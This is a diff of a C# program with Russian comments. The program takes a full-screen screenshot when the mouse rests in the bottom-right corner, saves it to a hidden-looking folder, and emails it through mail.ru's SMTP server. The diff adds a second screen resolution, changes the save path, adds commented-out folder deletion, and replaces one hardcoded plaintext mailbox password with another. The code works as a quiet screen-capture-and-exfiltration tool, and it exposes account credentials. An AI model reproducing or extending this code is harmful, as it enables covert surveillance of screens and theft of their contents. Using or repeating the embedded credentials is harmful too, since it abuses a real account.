@@ -1,17 +1,11 @@
 ﻿using System;
-using System.CodeDom;
 using System.Diagnostics;
-using System.Diagnostics.Eventing.Reader;
 using System.Drawing;
-using System.IO;
-using System.Linq;
 using System.Net; // Подключаем библиотеку для работы с сетью
 using System.Net.Mail; // Из библиотеки подключаем класс для работы с почтой
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows;
-using System.Windows.Forms;
-using static System.Net.Mime.MediaTypeNames;
 
 namespace YT1
 {
@@ -27,8 +21,17 @@ namespace YT1
                     Thread.Sleep(2000);
                     GC.Collect();
                     var mousePosition = ShowMousePosition();
-                    if ((mousePosition[0] == 1919) && (mousePosition[1] == 1079))
+                    if (((mousePosition[0] == 1919) && (mousePosition[1] == 1079)) || ((mousePosition[0] == 2559) && (mousePosition[1] == 1439)))
                         ScreenShot();
+                    //else if ((mousePosition[0] == 0) && (mousePosition[1] == 0))
+                    //{
+                    //    foreach (var proc in procces)
+                    //    {
+                    //        string dir = "C:\\sss";
+                    //        Directory.Delete(dir, true);
+                    //        proc.Kill();
+                    //    }
+                    //}
                     else
                         continue;
                 }
@@ -37,6 +40,8 @@ namespace YT1
             {
                 foreach (var proc in procces)
                 {
+                    //string dir = "C:\\sss";
+                    //Directory.Delete(dir, true);
                     proc.Kill();
                 }
             }
@@ -55,7 +60,7 @@ namespace YT1
                 attachment = new System.Net.Mail.Attachment(allName);
                 m.Attachments.Add(attachment);
                 SmtpClient smtp = new SmtpClient("smtp.mail.ru", 587); // Указываем хост и порт SMTP сервера с которого отправляем
-                smtp.Credentials = new NetworkCredential("slavegame.help@mail.ru", "LyphPvQtrfVGB5aqBxbB"); // Данные почты с которой будет производится отправка сообщения
+                smtp.Credentials = new NetworkCredential("slavegame.help@mail.ru", "HI4v5scA1jOC9nrpfhIC"); // Данные почты с которой будет производится отправка сообщения
                 smtp.EnableSsl = true; // SSL соединение если оно нужно для хоста
                 smtp.Send(m); // Отправляем сообщение
             }
@@ -80,7 +85,7 @@ namespace YT1
 
             g.CopyFromScreen(screenLeft, screenTop, 0, 0, bitmap_Screen.Size);
 
-            string allName = "C:\\imageCustom\\" + filename;
+            string allName = "C:\\sss\\" + filename;
             bitmap_Screen.Save(allName);
             SendMessage(allName);
         }
